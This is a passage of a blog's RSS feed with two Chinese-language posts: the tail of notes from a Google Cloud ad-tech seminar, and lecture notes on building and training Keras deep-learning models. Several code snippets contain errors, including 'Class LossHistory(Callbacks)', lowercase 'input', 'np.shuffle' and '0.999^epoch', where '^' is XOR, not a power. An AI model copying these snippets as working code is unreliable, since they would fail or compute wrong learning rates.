&lt;li&gt;Creative Optimizer  &lt;/li&gt;
&lt;li&gt;Ad Content Recommendation Engine  &lt;/li&gt;
&lt;li&gt;Dynamic Audience Scoring  &lt;/li&gt;
&lt;li&gt;作法  &lt;ul&gt;
&lt;li&gt;Know =&amp;gt; Personalize =&amp;gt; Engage  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;總結  &lt;ul&gt;
&lt;li&gt;只要有最佳化、預測的需求，就有機會利用 ML 達到最好的成果。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Google Cloud Platform 客戶實例分享&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;禾多  &lt;ul&gt;
&lt;li&gt;推播  &lt;/li&gt;
&lt;li&gt;Firebase  &lt;/li&gt;
&lt;li&gt;一天約上百萬到上千萬則推播  &lt;/li&gt;
&lt;li&gt;Datalab  &lt;ul&gt;
&lt;li&gt;sklearn, TensorFlow  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Koodata  &lt;ul&gt;
&lt;li&gt;從 AWS 轉換過來  &lt;/li&gt;
&lt;li&gt;機房在台灣，速度比較快  &lt;/li&gt;
&lt;li&gt;AI 相關應用  &lt;/li&gt;
&lt;li&gt;因為有使用 Google Adwords  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;GMobi  &lt;ul&gt;
&lt;li&gt;IoT，最近新增了手機廣告平台  &lt;/li&gt;
&lt;li&gt;需求：Realtime, Scalibility, Pricing, Reliability  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;UrAd  &lt;ul&gt;
&lt;li&gt;Data Source 較多元，得經過非常多的處理。  &lt;/li&gt;
&lt;li&gt;Data business 相關的架構轉移到 GCP  &lt;ul&gt;
&lt;li&gt;Pub/Sub  &lt;/li&gt;
&lt;li&gt;分析：Dataflow, Dataproc, Dataprep  &lt;/li&gt;
&lt;li&gt;儲存：BigQuery, Cloud Storage  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">m157q</dc:creator><pubDate>Fri, 22 Sep 2017 15:27:22 +0800</pubDate><guid isPermaLink="false">tag:blog.m157q.tw,2017-09-22:posts/2017/09/22/cloudmile-google-cloud-ad-tech-seminar/</guid><category>GCP</category><category>Ad Tech</category></item><item><title>台灣資料科學年會之系列活動：手把手的深度學習實務</title><link>https://blog.m157q.tw/posts/2017/08/13/deep-learning-hands-on-step-by-step-datasci-tw/</link><description>&lt;ul&gt;
&lt;li&gt;&lt;a href="http://foundation.datasci.tw/step-by-step-dl-170813/"&gt;http://foundation.datasci.tw/step-by-step-dl-170813/&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://drive.google.com/file/d/0B9cCeTKOkfWIbWtjdWJaRl9YRmM/view?usp=sharing"&gt;Slides&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;六步完模 – 建立深度學習模型&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;決定 hidden layers 層數與其中的 neurons 數量  &lt;/li&gt;
&lt;li&gt;決定該層使用的 activation function  &lt;/li&gt;
&lt;li&gt;決定模型的 loss function  &lt;/li&gt;
&lt;li&gt;決定 optimizer  &lt;ul&gt;
&lt;li&gt;Parameters: learning rate, momentum, decay  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;編譯模型 (Compile model)  &lt;/li&gt;
&lt;li&gt;開始訓練囉!(Fit model)  &lt;/li&gt;
&lt;/ol&gt;
&lt;hr /&gt;
&lt;h3&gt;關於 &lt;code&gt;validation_split&lt;/code&gt; 要注意的小地方&lt;/h3&gt;
&lt;p&gt;用 Keras 的 &lt;code&gt;validation_split&lt;/code&gt; 之前要記得把資料先弄亂，&lt;br /&gt;
因為它會從資料的最尾端開始取，&lt;br /&gt;
如果沒有弄亂的話切出來的資料 bias 會很大。&lt;br /&gt;
可以使用 &lt;code&gt;np.shuffle&lt;/code&gt; 來弄亂  &lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;Functional API&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Why “Functional API” ?  &lt;ul&gt;
&lt;li&gt;All layers and models are callable (like function call)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;keras.layers&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Input&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Dense&lt;/span&gt;  
&lt;span class="nb"&gt;input&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Input&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;shape&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;200&lt;/span&gt;&lt;span class="p"&gt;,))&lt;/span&gt;  
&lt;span class="n"&gt;output&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Dense&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="nb"&gt;input&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;+ 類似 f(x) 的寫法  
    + Dense(10) == f  
    + input == x  
+ 好處是可以 assign 給自己後再用 for loop 很快建非常多層 layer，不用一直用 `model.add`  
+ Easy to manipulate various inpout sources
&lt;/pre&gt;&lt;/div&gt;


&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;x1 = input(shape=(10,))  
y1 = Dense(100)(x1)  

x2 = input(shape=(20,))  
new_x2 = keras.layers.concatenate([y1,x2])  
output = Dense(200)(new_x2)  

Model = Model(inputs=[x1,x2],outputs=[output])  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h3&gt;Loss function&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;為什麼 Cross-entropy 比 Squared error 好？  &lt;ul&gt;
&lt;li&gt;Cross-entropy 的 Gradient 比較大，學習速度比較快。  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.complex-systems.com/pdf/02-6-1.pdf"&gt;The error surface of logarithmic functions is steeper than&lt;br /&gt;
that of quadratic functions.&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;How to select Loss function  &lt;ul&gt;
&lt;li&gt;Classification 常用 cross-entropy  &lt;ul&gt;
&lt;li&gt;搭配 softmax 當作 output layer 的 activation function  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Regression 常用 mean absolute/squared error  &lt;/li&gt;
&lt;li&gt;對特定問題定義 loss function  &lt;ul&gt;
&lt;li&gt;Unbalanced dataset, class 0 : class 1 = 99 : 1  &lt;ul&gt;
&lt;li&gt;Class 1 做錯的話，給它 penalty 99  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Self-defined loss function  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Learning Rate&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;觀察 Loss，如果有振盪的話，代表 learning rate 可能太大  &lt;/li&gt;
&lt;li&gt;觀察 Loss，下降的太緩慢的話，代表 learning rate 可能太小  &lt;/li&gt;
&lt;li&gt;選擇適合的 learning rate 對於 training model 會是很大的影響  &lt;/li&gt;
&lt;li&gt;通常不會大於 0.1  &lt;/li&gt;
&lt;li&gt;一次調整一個數量級  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Activation Function&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;Activation Function 可能是最重要的  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Sigmoid, Tanh, Softsign  &lt;ul&gt;
&lt;li&gt;Sigmoid 介於 0~1 之間  &lt;/li&gt;
&lt;li&gt;Tanh, Softsign 介於 -1~1 之間  &lt;/li&gt;
&lt;li&gt;值域是有限制的  &lt;ul&gt;
&lt;li&gt;Input 過大或過小影響其實不大  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Derivatives of Sigmoid, Tanh, Softsign  &lt;ul&gt;
&lt;li&gt;Input 過大或過小時，Gradient 太小，學習就會很慢  &lt;/li&gt;
&lt;li&gt;所以通常太深的 model 不建議用這 3 個 Activation Function  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Drawbacks of Sigmoid, Tanh, Softsign  &lt;ul&gt;
&lt;li&gt;Vanishing gradient problem  &lt;ul&gt;
&lt;li&gt;原因: input 被壓縮到一個相對很小的output range  &lt;/li&gt;
&lt;li&gt;結果: 很大的 input 變化只能產生很小的 output 變化 =&amp;gt; Gradient 小 =&amp;gt; 無法有效地學習  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;特別不適用於深的深度學習模型  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ReLU, Softplus  &lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在 TensorFlow 上用 Softplus 好像會遇到一些問題  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Derivatives of ReLU, Softplus  &lt;ul&gt;
&lt;li&gt;ReLU 在輸入小於零時, gradient 等於零,會有問題嗎?  &lt;ul&gt;
&lt;li&gt;小於 0 的時候可能就不學習了，所以有人提出了 Leaky ReLU  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Leaky ReLU  &lt;ul&gt;
&lt;li&gt;Allow a small gradient while the input to activation function smaller than 0  &lt;/li&gt;
&lt;li&gt;在 input &amp;lt; 0 時，還是給他一點些微的斜率  &lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在用 ReLU 的時候 Learning rate 可能要用小一點，效果會比較好。  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Optimizer&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;SGD – Stochastic Gradient Descent  &lt;ul&gt;
&lt;li&gt;Stochastic gradient descent  &lt;/li&gt;
&lt;li&gt;支援 momentum, learning rate decay, Nesterov momentum  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;keras.optimizer.SGD(lr=0.01, momentum=0.0, decay=0.0, nesterov=False)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Momentum 的影響  &lt;ul&gt;
&lt;li&gt;無 momentum: &lt;code&gt;update = -lr*gradient&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;有 momentum: &lt;code&gt;update = -lr*gradient + m*last_update&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Learning rate decay after update once  &lt;ul&gt;
&lt;li&gt;屬於 &lt;code&gt;1/t decay =&amp;gt; lr = lr / (1 + decay*t)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;t: number of done updates  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Momentum vs Nesterov Momentum  &lt;ul&gt;
&lt;li&gt;Momentum  &lt;ul&gt;
&lt;li&gt;先算 gradient  &lt;/li&gt;
&lt;li&gt;加上 momentum  &lt;/li&gt;
&lt;li&gt;更新  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Nesterov Momentum  &lt;ul&gt;
&lt;li&gt;加上 momentum  &lt;/li&gt;
&lt;li&gt;再算 gradient  &lt;/li&gt;
&lt;li&gt;更新  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;兩者出來的效果沒有太大的差別，沒有誰比較好，只是聽到有人用 Nesterov 的時候要知道差別。  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Adagrad – Adaptive Learning Rate  &lt;ul&gt;
&lt;li&gt;因材施教:每個參數都有不同的 learning rate  &lt;/li&gt;
&lt;li&gt;根據之前所有 gradient 的 root mean square 修改  &lt;/li&gt;
&lt;li&gt;Feature scales 不同,需要不同的 learning rates  &lt;/li&gt;
&lt;li&gt;每個 weight 收斂的速度不一致  &lt;ul&gt;
&lt;li&gt;但 learning rate 沒有隨著減少的話  bumpy  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;根據之前所有 gradient 的 root mean square 修改  &lt;/li&gt;
&lt;li&gt;老馬識途,參考之前的經驗修正現在的步伐  &lt;/li&gt;
&lt;li&gt;不完全相信當下的 gradient  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RMSprop – Similar with Adagrad  &lt;ul&gt;
&lt;li&gt;另一種參考過去 gradient 的方式  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;keras.optimizers.RMSprop(lr=0.001, rho=0.9, epsilon=1e-08, decay=0.0)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Adagrad 不管多久之前的經驗都把其權重視為相同的，RMSprop 就是針對這部份做改進，愈久之前的經驗其權重會變得愈低。  &lt;/li&gt;
&lt;li&gt;這個 Activation 是作者在 Coursera 授課時提出的，沒有論文，所以大家在論文使用這個 activation function 的時候都會 cite 那個 coursera 課程的網址，而且還不少人用的 XDDD  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Adam – Similar with RMSprop + Momentum  &lt;ul&gt;
&lt;li&gt;Close to RMSprop + Momentum  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://arxiv.org/pdf/1412.6980v8.pdf"&gt;ADAM: A Method For Stochastic Optimization&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;In practice, 不改參數也會做得很好  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;keras.optimizer.Adam(lr=0.001, beta_1=0.9, beta_2=0.999, epsilon=1e-08, decay=0.0)&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Nadam – Adam + Nesterov Momentum  &lt;/li&gt;
&lt;li&gt;How to select Optimizer  &lt;ul&gt;
&lt;li&gt;一般的起手式: Adam  &lt;ul&gt;
&lt;li&gt;Adaptive learning rate for every weights  &lt;/li&gt;
&lt;li&gt;Momentum included  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Keras 推薦 RNN 使用 RMSProp  &lt;ul&gt;
&lt;li&gt;在訓練 RNN 需要注意 explosive gradient 的問題 =&amp;gt; clip gradient 的暴力美學  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;RMSProp 與 Adam 的戰爭仍在延燒  &lt;ul&gt;
&lt;li&gt;各有千秋  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;處理 Overfitting&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Regularization  &lt;ul&gt;
&lt;li&gt;限制 weights 的大小讓 output 曲線比較平滑  &lt;/li&gt;
&lt;li&gt;Weight 較小，input 的差異對 output 產生的影響比較沒有那麼大  &lt;/li&gt;
&lt;li&gt;α (Regularizer) 是用來調整 regularization 的比重  &lt;ul&gt;
&lt;li&gt;避免顧此失彼 (降低 weights 的大小而犧牲模型準確性)&lt;br /&gt;
避免顧此失彼 (降低 weights 的大小而犧牲模型準確性)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;L1 and L2 Regularizers  &lt;ul&gt;
&lt;li&gt;L1 norm: Sum of absolute values  &lt;/li&gt;
&lt;li&gt;L2 norm: Root mean square of absolute values  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Early Stopping  &lt;ul&gt;
&lt;li&gt;希望在 Model overfitting 之前就停止 training  &lt;/li&gt;
&lt;li&gt;假如可以停在 loss 最低的點的話就好了  &lt;/li&gt;
&lt;li&gt;Early Stopping in Keras  &lt;ul&gt;
&lt;li&gt;&lt;code&gt;from keras.callbacks import EarlyStopping&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;early_stopping=EarlyStopping(monitor='val_loss', patience=3)&lt;/code&gt;  &lt;/li&gt;
&lt;li&gt;monitor: 要監控的 performance index  &lt;/li&gt;
&lt;li&gt;patience: 可以容忍連續幾次的不思長進  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Dropout  &lt;ul&gt;
&lt;li&gt;What is Dropout  &lt;ul&gt;
&lt;li&gt;原本為 neurons 跟 neurons 之間為 fully connected  &lt;/li&gt;
&lt;li&gt;在訓練過程中,隨機拿掉一些連結 (weight 設為0)  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;會造成 training performance 變差  &lt;ul&gt;
&lt;li&gt;Error 變大 =&amp;gt; 每個 neuron 修正得越多 =&amp;gt; 做得越好  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Implications  &lt;ul&gt;
&lt;li&gt;增加訓練的難度，在真正的考驗時爆發  &lt;/li&gt;
&lt;li&gt;Dropout 可視為一種終極的 ensemble 方法，N 個 weights 會有 2^N 種 network structures  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;通常只加在 hidden layer，不會加在 output layer，因為影響太大了，除非 output layer 的 dimension 很大。  &lt;/li&gt;
&lt;li&gt;注意事項  &lt;ul&gt;
&lt;li&gt;「不要一開始就加入 Dropout」*3  &lt;/li&gt;
&lt;li&gt;確定有遇到 Overfitting 再加 Dropout  &lt;/li&gt;
&lt;li&gt;Dropout 會讓 training performance 變差  &lt;/li&gt;
&lt;li&gt;確定 performance 夠好再加 Dropout，不然 Performance 變低，就算解掉了 Overfitting，出來的結果也沒啥用。  &lt;/li&gt;
&lt;li&gt;Dropout 是在避免 overfitting，不是萬靈丹  &lt;/li&gt;
&lt;li&gt;參數少時，regularization  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h3&gt;Callbacks: 善用 Callbacks 幫助你躺著 train models&lt;/h3&gt;
&lt;h4&gt;Callback Class&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;keras.callbacks&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Callbacks&lt;/span&gt;  

&lt;span class="n"&gt;Class&lt;/span&gt; &lt;span class="n"&gt;LossHistory&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Callbacks&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;on_train_begin&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;logs&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{}):&lt;/span&gt;  
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loss&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;  
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;acc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;  
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;val_loss&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;  
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;val_acc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt;  

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;on_batch_end&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;batch&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;logs&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="p"&gt;{}):&lt;/span&gt;  
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;loss&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;logs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;loss&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;acc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;logs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;acc&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;val_loss&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;logs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;val_loss&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;val_acc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;append&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;logs&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;val_acc&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;  

    &lt;span class="n"&gt;loss_history&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;LossHistory&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;Callback 的時機&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;on_train_begin  &lt;/li&gt;
&lt;li&gt;on_train_end  &lt;/li&gt;
&lt;li&gt;on_batch_begin  &lt;/li&gt;
&lt;li&gt;on_batch_end  &lt;/li&gt;
&lt;li&gt;on_epoch_begin  &lt;/li&gt;
&lt;li&gt;on_epoch_end  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;LearningRateScheduler&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;keras.callbacks&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;LearningRateScheduler&lt;/span&gt;  

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;step_decay&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;epoch&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;  
    &lt;span class="n"&gt;initial_lrate&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mf"&gt;0.1&lt;/span&gt;  
    &lt;span class="n"&gt;lrate&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;initial_lrate&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mf"&gt;0.999&lt;/span&gt;&lt;span class="o"&gt;^&lt;/span&gt;&lt;span class="n"&gt;epoch&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;lrate&lt;/span&gt;  

&lt;span class="n"&gt;Lrate&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;LearningRateScheduler&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;step_decay&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;ModelCheckpoint&lt;/h4&gt;
&lt;p&gt;超級好用  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;keras.callbacks&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;ModelCheckpoint&lt;/span&gt;  

&lt;span class="n"&gt;checkpoint&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ModelCheckpoint&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;  
    &lt;span class="s1"&gt;&amp;#39;model.h5&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
    &lt;span class="n"&gt;monitor&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;val_loss&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
    &lt;span class="n"&gt;verbose&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
    &lt;span class="n"&gt;save_best_only&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
    &lt;span class="n"&gt;mode&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;min&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;  
&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;&lt;code&gt;mode&lt;/code&gt; 可以設定成 &lt;code&gt;'auto'&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;在 &lt;code&gt;model.fit&lt;/code&gt; 時加入 Callbacks&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;history = model.fit(  
    X_train,  
    Y_train,  
    batch_size=16,  
    verbose=0,  
    epochs=30,  
    shuffle=True,  
    validation_split=0.1,  
    callbacks=[  
        early_stopping,  
        loss_history,  
        lrate,  
        checkpoint,  
    ],  
)  
&lt;/pre&gt;&lt;/div&gt;


